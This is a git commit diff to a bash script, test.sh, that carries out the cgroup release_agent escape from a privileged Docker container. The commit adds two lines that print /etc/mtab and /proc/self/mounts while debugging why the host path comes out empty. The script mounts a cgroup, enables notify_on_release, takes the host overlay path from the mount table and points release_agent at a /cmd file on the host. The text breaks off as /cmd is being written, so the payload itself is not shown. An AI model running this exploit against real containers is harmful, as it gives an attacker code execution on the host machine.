34850775512a1ff73c7a0e3734b0090d59f9e2a2
Kohsuke Kawaguchi <kk@kohsuke.org>
2021-03-01 19:27:32 -0800

    hostpath is empty

--- test.sh
+++ test.sh
@@ -1,9 +1,12 @@
 #!/bin/bash -x
 # see https://betterprogramming.pub/escaping-docker-privileged-containers-a7ae7d17f5a1
+# see https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/
 mkdir /tmp/cgrp
 mount -t cgroup -o memory cgroup /tmp/cgrp
 mkdir /tmp/cgrp/x
 echo 1 > /tmp/cgrp/x/notify_on_release
+cat /etc/mtab
+cat /proc/self/mounts
 host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
 echo "$host_path/cmd" > /tmp/cgrp/release_agent
 echo '#!/bin/sh' > /cmd
